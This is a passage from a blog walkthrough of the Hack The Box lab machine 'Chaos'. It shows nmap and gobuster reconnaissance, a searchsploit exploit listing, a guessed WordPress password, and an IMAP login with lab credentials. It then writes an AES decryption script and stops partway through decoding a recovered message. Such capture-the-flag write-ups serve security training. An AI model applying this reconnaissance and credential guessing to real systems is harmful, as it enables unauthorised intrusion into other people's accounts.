@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Chaos: Hack The Box Walkthrough</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Chaos: Hack The Box Walkthrough" />
+<meta name="author" content="jseals" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Background" />
+<meta property="og:description" content="Background" />
+<link rel="canonical" href="http://localhost:4000/2019/05/25/htb-chaos-walkthrough.html" />
+<meta property="og:url" content="http://localhost:4000/2019/05/25/htb-chaos-walkthrough.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-05-25T00:00:00-05:00" />
+<script type="application/ld+json">
+{"datePublished":"2019-05-25T00:00:00-05:00","dateModified":"2019-05-25T00:00:00-05:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2019/05/25/htb-chaos-walkthrough.html"},"url":"http://localhost:4000/2019/05/25/htb-chaos-walkthrough.html","author":{"@type":"Person","name":"jseals"},"description":"Background","@type":"BlogPosting","headline":"Chaos: Hack The Box Walkthrough","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1></h1>
+        <h2></h2>
+        <h3> <nav>
+    
+        <a href="/" >Home </a>
+    
+        <a href="/about.html" >About </a>
+    
+        <a href="/blog.html" >Blog </a>
+    
+</nav>
+ </h3>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>25 May 2019</small>
+<h1>Chaos: Hack The Box Walkthrough</h1>
+
+<p class="view">by jseals</p>
+
+<h2 id="background">Background</h2>
+
+<p>Chaos is a “vulnerable by design” machine from <a href="https://www.hackthebox.eu">hackthebox.eu</a>. In this walkthrough I perform the actions of an attacker. The goal is twofold, first, get user-level privileges on the box and get the key in /home/$USER/user.txt. Second, escalate privileges to root and get the flag at /root/root.txt.</p>
+
+<h2 id="victim-machine-specs">Victim Machine Specs</h2>
+
+<ol>
+  <li>OS - Linux</li>
+  <li>IP - 10.10.10.120</li>
+</ol>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-A</span> 10.10.10.120
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE  VERSION
+80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
+|_http-server-header: Apache/2.4.34 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3     Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE TOP RESP-CODES STLS CAPA SASL PIPELINING UIDL
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: have more post-login ID Pre-login listed LOGIN-REFERRALS LOGINDISABLEDA0001 OK capabilities IMAP4rev1 STARTTLS ENABLE SASL-IR IDLE LITERAL+
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+|_imap-capabilities: more have ID Pre-login post-login LOGIN-REFERRALS listed OK capabilities IMAP4rev1 AUTH=PLAINA0001 ENABLE SASL-IR IDLE LITERAL+
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE TOP RESP-CODES PIPELINING CAPA SASL(PLAIN) USER UIDL
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=5/17%OT=80%CT=1%CU=43255%PV=Y%DS=2%DC=T%G=Y%TM=5CDEB6F
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT      ADDRESS
+1   49.22 ms 10.10.14.1
+2   49.53 ms 10.10.10.120
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.65 seconds
+</code></pre></div></div>
+
+<p>From this output we gather there is an Apache webserver with version 2.4.34, and e-mail services running on standard ports. We also see another web service running on port 10000. Nmap tells us this is “MiniServ 1.890” otherwise known as “webmin”.</p>
+
+<p>At this point we may as well try and browse the web servers on port 80 and 10000 to see if we get any hints. We go to port 80 in our browser and are greeted with this:</p>
+
+<p><img src="/assets/images/posts/chaos-htb-walkthrough/chaos-1304.png" alt="chaos-1304.png" /></p>
+
+<p>Not much there, let’s try the MiniServ webmin service on port 10000:</p>
+
+<p><img src="/assets/images/posts/chaos-htb-walkthrough/chaos-3823.png" alt="chaos-3823.png" /></p>
+
+<p>It’s saying we need to hit that service over https, not http, so we try that instead:</p>
+
+<p><img src="/assets/images/posts/chaos-htb-walkthrough/chaos-3918.png" alt="chaos-3918.png" /></p>
+
+<p>We get a login prompt, but we have no credentials to try. We could potentially brute-force the login, but there’s usually a better way. Let’s save this for later and continue enumeration.</p>
+
+<p>Now that we know what services are open to us, we can look for pubically available exploits for these services and specific versions. The searchsploit tool queries <a href="https://www.exploit-db.com">exploit-db.com</a> from the cli:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ searchsploit -t webmin
+----------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                   |  Path
+                                                                 | (/usr/share/exploitdb/)
+----------------------------------------------------------------- ----------------------------------------
+DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal  | exploits/cgi/webapps/23535.txt
+Webmin - Brute Force / Command Execution                         | exploits/multiple/remote/705.pl
+Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing      | exploits/linux/remote/22275.pl
+Webmin 0.x - 'RPC' Privilege Escalation                          | exploits/linux/remote/21765.pl
+Webmin 0.x - Code Input Validation                               | exploits/linux/local/21348.txt
+Webmin 1.5 - Brute Force / Command Execution                     | exploits/multiple/remote/746.pl
+Webmin 1.5 - Web Brute Force (CGI)                               | exploits/multiple/remote/745.pl
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasp | exploits/unix/remote/21851.rb
+Webmin 1.850 - Multiple Vulnerabilities                          | exploits/cgi/webapps/42989.txt
+Webmin 1.900 - Remote Command Execution (Metasploit)             | exploits/cgi/remote/46201.rb
+Webmin 1.x - HTML Email Command Execution                        | exploits/cgi/webapps/24574.txt
+Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (PH | exploits/multiple/remote/1997.php
+Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (Pe | exploits/multiple/remote/2017.pl
+phpMyWebmin 1.0 - 'target' Remote File Inclusion                 | exploits/php/webapps/2462.txt
+phpMyWebmin 1.0 - 'window.php' Remote File Inclusion             | exploits/php/webapps/2451.txt
+webmin 0.91 - Directory Traversal                                | exploits/cgi/remote/21183.txt
+</code></pre></div></div>
+
+<p>We get a lot back, but only one could potentially work for us, “Webmin 1.900 - Remote Command Execution (Metasploit)”. This exploit is for a version higher than what this server is running, but often times lower versions will also be vulnerable to the same exploit depending on when the exploitable code was introduced to the software. We can examine the exploit contents with searchsploit as well:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ searchsploit -x 46201
+</code></pre></div></div>
+
+<p>Reading through the exploit notes, we do in fact see this affects lower versions. The exploit allows for remote command execution (RCE), but one must be authorized first. We may be able to use this later, but without credentials to the webmin login portal it won’t do us much good. I looked for dovecot and apache exploits for the listed versions, but didn’t find much either.</p>
+
+<p>Since we didn’t find anything on the homepages, let’s use gobuster to spider the website and look for sub-directories:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ gobuster -u 10.10.10.120 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre></div></div>
+
+<p>Among other directories, gobuster returns a /wp directory. Let’s checkout their wordpress website, browsing to http://10.10.10.120/wp takes us to a directory listing with a ‘wordpress’ directory. Clicking that takes us to the wordpress site this server is hosting:</p>
+
+<p><img src="/assets/images/posts/chaos-htb-walkthrough/chaos-5647.png" alt="chaos-5647.png" /></p>
+
+<p>A password protected blog post… Not many hints to go off of and I had difficultly using hydra to bruteforce this POST form. I clicked around the website, and ended up clicking the “Protected: chaos” link under the recent posts title and got a slightly different page:</p>
+
+<p><img src="/assets/images/posts/chaos-htb-walkthrough/chaos-5417.png" alt="chaos-5417.png" /></p>
+
+<p>There is a slight change, it includes the author, “BY HUMAN”. Thinking this may be a clue, I tried ‘human’ as the password and it worked. The hidden post now reveals itself to be some webmail credentials I’m sure will be used later in the exercise:</p>
+
+<p><img src="/assets/images/posts/chaos-htb-walkthrough/chaos-5435.png" alt="chaos-5435.png" /></p>
+
+<p>Remember back to our nmap scan results, there were IMAP and POP3 services running. Maybe these credentials will work there, so we try the IMAP encrypted port first using openssl:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ openssl s_client -crlf -connect 10.10.10.120:993
+</code></pre></div></div>
+
+<p>There’s a lot of certificate exchange I’ll exclude, but we get a ready prompt from the Dovecot e-mail service.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>read R BLOCK
+* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
+</code></pre></div></div>
+
+<p>Let’s try using the webmail credentials we got from the WordPress blog post to login (IMAP commands are detailed in RFC-3501):</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>read R BLOCK
+* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
+a001 LOGIN ayush jiujitsu
+</code></pre></div></div>
+
+<p>The credentials work, we get a “OK” and “Logged in” message from the server:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu)
+ready.
+a001 LOGIN ayush jiujitsu
+a001 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES
+THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS
+LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS 
+BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] 
+Logged in
+</code></pre></div></div>
+
+<p>Now that we’re logged in, let’s look for mailboxes and hopefully find some e-mails:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a001 LIST "" "*"
+* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
+* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
+* LIST (\HasNoChildren) "/" INBOX
+a001 OK List completed (0.003 + 0.000 + 0.002 secs).
+</code></pre></div></div>
+
+<p>We see Drafts, Sent, and the default INBOX mailboxes. After looking through them, we find one item in Drafts:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a001 EXAMINE Drafts
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS ()] Read-only mailbox.
+* 1 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1540728611] UIDs valid
+* OK [UIDNEXT 5] Predicted next UID
+a001 OK [READ-ONLY] Examine completed (0.004 + 0.000 + 0.003 secs).
+</code></pre></div></div>
+
+<p>Let’s view the e-mail:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a001 FETCH 1 BODY[]
+* 1 FETCH (BODY[] {2532}
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+ boundary="=_00b34a28b9033c43ed09c0950f4176e1"
+Date: Sun, 28 Oct 2018 17:46:38 +0530
+From: ayush &lt;ayush@localhost&gt;
+To: undisclosed-recipients:;
+Subject: service
+Message-ID: &lt;7203426a8678788517ce8d28103461bd@webmail.chaos.htb&gt;
+X-Sender: ayush@localhost
+User-Agent: Roundcube Webmail/1.3.8
+
+--=_00b34a28b9033c43ed09c0950f4176e1
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=US-ASCII;
+ format=flowed
+
+Hii, sahay
+Check the enmsg.txt
+You are the password XD.
+Also attached the script which i used to encrypt.
+Thanks,
+Ayush
+</code></pre></div></div>
+
+<p>I cut the base64 encoded attachments that were also in the e-mail for the sake of space. The first attachment was a python script named “en.py” which looks to be an incomplete script that encrypts another file’s contents and writes it to a new file. The second attachment contained what looked to be random / encrypted data. Mostly random data with an integer near where the magic bytes should be.</p>
+
+<p>Here’s the incomplete python script we found in the e-mail:</p>
+
+<div class="filename"><span>en.py</span></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="n">chunksize</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">1024</span>
+    <span class="n">outputFile</span> <span class="o">=</span> <span class="s">"en"</span> <span class="o">+</span> <span class="n">filename</span>
+    <span class="n">filesize</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">IV</span> <span class="o">=</span><span class="n">Random</span><span class="o">.</span><span class="n">new</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outputFile</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
+            <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">filesize</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+            <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">IV</span><span class="p">)</span>
+
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">chunk</span> <span class="o">=</span> <span class="n">infile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunksize</span><span class="p">)</span>
+
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">chunk</span> <span class="o">+=</span> <span class="n">b</span><span class="s">' '</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">))</span>
+
+                <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">getKey</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
+            <span class="n">hasher</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+            <span class="k">return</span> <span class="n">hasher</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Simple enough, the method “getKey” takes in a string and returns a sha256 digest of that string. This is commonly used as a key for this type of AES encryption as the length requirements match perfectly. Next, the encrypt function takes in that same key and a filepath. We can now see what that integer in the encrypted file was the file’s size that is to be encrypted + the IV used for encryption. The encrypt method takes chunks of the file passed in, 16 bytes at a time and encrypts them before writing them to a new file. Our next step is to write a decrypter.</p>
+
+<p>I’ve cleaned up the original code so it’s functional and included a decrypt method. The only parameter we weren’t given in the original python script is the password that is used to create the AES key. Referring back to the text in the e-mail:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"Hii, sahay
+Check the enmsg.txt
+You are the password XD."
+</code></pre></div></div>
+
+<p>So, I used “sahay” as the password, and this seemed to work. The fixed code with the new decrypt method is below:</p>
+
+<div class="filename"><span>decrypt.py</span></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">Crypto</span> <span class="kn">import</span> <span class="n">Random</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="n">chunksize</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">1024</span>
+    <span class="n">outputFile</span> <span class="o">=</span> <span class="s">"en"</span> <span class="o">+</span> <span class="n">filename</span>
+    <span class="n">filesize</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">IV</span> <span class="o">=</span><span class="n">Random</span><span class="o">.</span><span class="n">new</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outputFile</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
+            <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">filesize</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+            <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">IV</span><span class="p">)</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">chunk</span> <span class="o">=</span> <span class="n">infile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunksize</span><span class="p">)</span>
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">chunk</span> <span class="o">+=</span> <span class="n">b</span><span class="s">' '</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">))</span>
+                <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">passw</span><span class="p">):</span>
+    <span class="n">chunksize</span> <span class="o">=</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span>
+    <span class="n">fo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="n">fo</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">IV</span> <span class="o">=</span> <span class="n">Random</span><span class="o">.</span><span class="n">new</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">passw</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted</span> <span class="o">+</span> <span class="s">'de'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">chunk</span> <span class="o">=</span> <span class="n">infile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunksize</span><span class="p">)</span>
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">chunk</span> <span class="o">+=</span> <span class="n">b</span><span class="s">' '</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">))</span>
+                <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">getKey</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
+            <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">h</span>
+
+<span class="n">passw</span> <span class="o">=</span> <span class="n">getKey</span><span class="p">(</span><span class="s">'sahay'</span><span class="p">)</span>
+<span class="n">decrypt</span><span class="p">(</span><span class="s">'enim_msg.txt'</span><span class="p">,</span> <span class="n">passw</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>I didn’t bother to ignore the first 32 bytes that contained filesize + IV data, but I could have as this wasn’t originally encrypted. Once our decryption method runs, we output a new file:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG
+1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45
+X0gzcjMKClRoYW5rcywKQXl1c2gK
+</code></pre></div></div>
+
+<p>Well, It’s less random than it was so the decryption seems to have worked, but there’s another layer of obfuscation. Luckily, this looks to be the easily identifiable base64 encoding. Let’s decode and print this in ipython:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">base64</span>
+<span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="k">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">'SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0</span><span class="err">
+</span><span class="s">   ...: b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRo</span><span class="err">
+</span><span class="s">   ...: YW5rcywKQXl1c2gK'</span><span class="p">)</span>
+<span class="n">Hii</span> <span class="n">Sahay</span>
+<span class="n">Please</span> <span class="n">check</span> <span class="n">our</span> <span class="n">new</span> <span class="n">service</span> <span class="n">which</span> <span class="n">create</span> <span class="n">pdf</span>
+<span class="n">p</span><span class="o">.</span><span class="n">s</span> <span class="o">-</span> <span class="n">As</span> <span class="n">you</span> <span class="n">told</span> <span class="n">me</span> <span class="n">to</span> <span class="n">encrypt</span> <span class="n">important</span> <span class="n">msg</span><span class="p">,</span> <span class="n">i</span> <span class="n">did</span> <span class="p">:)</span>
